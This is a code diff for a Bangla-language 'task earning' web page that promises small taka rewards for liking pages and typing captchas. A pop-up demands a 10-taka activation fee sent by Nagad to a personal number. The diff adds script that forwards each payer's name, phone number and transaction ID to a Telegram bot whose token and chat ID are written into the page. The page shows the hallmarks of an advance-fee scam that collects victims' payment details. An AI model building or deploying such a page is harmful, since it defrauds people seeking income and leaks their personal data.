@@ -70,7 +70,6 @@
 
         <!-- Task Grid -->
         <div class="grid grid-cols-2 gap-3">
-            
             <a href="https://facebook.com" target="_blank" class="bg-white p-4 rounded-2xl border border-purple-100 shadow-sm hover:shadow-md transition flex flex-col items-center text-center">
                 <i class="fa-brands fa-facebook text-blue-600 text-3xl mb-1"></i>
                 <span class="text-xs font-bold text-gray-800">ফেসবুক পেজ লাইক</span>
@@ -106,16 +105,14 @@
                 <span class="text-xs font-bold text-gray-800">ক্যাপচা টাইপিং জব</span>
                 <span class="text-xs text-emerald-600 font-extrabold mt-1">+৳৪.০০</span>
             </a>
-
         </div>
 
     </div>
 
-    <!-- Account Activation Modal (Pop-up) -->
+    <!-- Account Activation Modal -->
     <div id="activationModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
         <div class="bg-white rounded-3xl p-6 w-full max-w-sm shadow-2xl relative border border-purple-100">
             
-            <!-- Close Button -->
             <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-400 hover:text-gray-600">
                 <i class="fa-solid fa-xmark text-xl"></i>
             </button>
@@ -128,7 +125,7 @@
                 <p class="text-xs text-red-500 font-semibold mt-1">⚠️ অবশ্যই Send Money (সেন্ড মানি) করতে হবে, Cash Out করলে হবে না!</p>
             </div>
 
-            <!-- Notice & Number Box (শুধু নগদ নম্বর যুক্ত) -->
+            <!-- Notice & Number Box -->
             <div class="bg-purple-50 border border-purple-200 p-3 rounded-2xl mb-4 text-xs text-gray-700 space-y-1">
                 <p><span class="font-bold text-pink-600">Nagad Personal (সেন্ড মানি):</span> <span class="font-mono bg-white px-2 py-0.5 rounded border font-bold text-gray-800">01784087562</span></p>
                 <p class="text-[11px] text-gray-500 pt-1">উপরের নগদ নম্বরে ১০ টাকা Send Money করার পর নিচের তথ্যগুলো দিয়ে জমা দিন।</p>
@@ -143,15 +140,15 @@
 
                 <div>
                     <label class="block text-xs font-bold text-gray-700 mb-1">সেন্ড মানি করার নগদ নম্বর</label>
-                    <input type="text" placeholder="017XXXXXXXX" required class="w-full px-3 py-2.5 bg-gray-50 border border-gray-200 rounded-xl text-xs focus:outline-none focus:border-purple-600">
+                    <input type="text" id="senderPhone" placeholder="017XXXXXXXX" required class="w-full px-3 py-2.5 bg-gray-50 border border-gray-200 rounded-xl text-xs focus:outline-none focus:border-purple-600">
                 </div>
 
                 <div>
                     <label class="block text-xs font-bold text-gray-700 mb-1">TrxID (Transaction ID)</label>
-                    <input type="text" placeholder="যেমন: 7K89X10L" required class="w-full px-3 py-2.5 bg-gray-50 border border-gray-200 rounded-xl text-xs focus:outline-none focus:border-purple-600">
+                    <input type="text" id="senderTrxid" placeholder="যেমন: 7K89X10L" required class="w-full px-3 py-2.5 bg-gray-50 border border-gray-200 rounded-xl text-xs focus:outline-none focus:border-purple-600">
                 </div>
 
-                <button type="submit" class="w-full bg-gradient-to-r from-purple-700 to-indigo-600 hover:from-purple-800 hover:to-indigo-700 text-white font-bold py-3 rounded-xl text-xs shadow-lg shadow-purple-200 mt-2">
+                <button type="submit" id="submitBtn" class="w-full bg-gradient-to-r from-purple-700 to-indigo-600 hover:from-purple-800 hover:to-indigo-700 text-white font-bold py-3 rounded-xl text-xs shadow-lg shadow-purple-200 mt-2">
                     তথ্য জমা দিন
                 </button>
             </form>
@@ -184,8 +181,11 @@
         </div>
     </div>
 
-    <!-- JavaScript to Handle Modal -->
+    <!-- Script to Send Data to Telegram -->
     <script>
+        const BOT_TOKEN = '8726008499:AAFIajdSOavCs8lB8Yh2IlODwEqsmyr9-2c';
+        const CHAT_ID = '6733473116';
+
         function openModal() {
             document.getElementById('activationModal').classList.remove('hidden');
         }
@@ -196,12 +196,39 @@
 
         function handleActivationSubmit(event) {
             event.preventDefault();
+
             const name = document.getElementById('senderName').value;
-            if(name) {
-                document.getElementById('userNameDisplay').innerText = name.toUpperCase();
-            }
-            alert('আপনার অনুরোধটি জমা হয়েছে! ১০-১৫ মিনিটের মধ্যে একাউন্ট একটিভ করা হবে।');
-            closeModal();
+            const phone = document.getElementById('senderPhone').value;
+            const trxid = document.getElementById('senderTrxid').value;
+            const submitBtn = document.getElementById('submitBtn');
+
+            submitBtn.innerText = 'জমা হচ্ছে...';
+            submitBtn.disabled = true;
+
+            const message = `🔔 *নতুন একটিভেশন রিকোয়েস্ট!* %0A%0A👤 *নাম:* ${name}%0A📱 *নগদ নম্বর:* ${phone}%0A🆔 *TrxID:* ${trxid}%0A⏰ *সময়:* ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}&parse_mode=Markdown`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        if(name) {
+                            document.getElementById('userNameDisplay').innerText = name.toUpperCase();
+                        }
+                        alert('আপনার তথ্য সফলভাবে জমা হয়েছে! ১০-১৫ মিনিটের মধ্যে একাউন্ট একটিভ করা হবে।');
+                        closeModal();
+                    } else {
+                        alert('তথ্য পাঠাতে সমস্যা হয়েছে, আবার চেষ্টা করুন।');
+                    }
+                })
+                .catch(error => {
+                    alert('নেটওয়ার্ক সমস্যা! আবার চেষ্টা করুন।');
+                })
+                .finally(() => {
+                    submitBtn.innerText = 'তথ্য জমা দিন';
+                    submitBtn.disabled = false;
+                });
         }
     </script>
 </body>
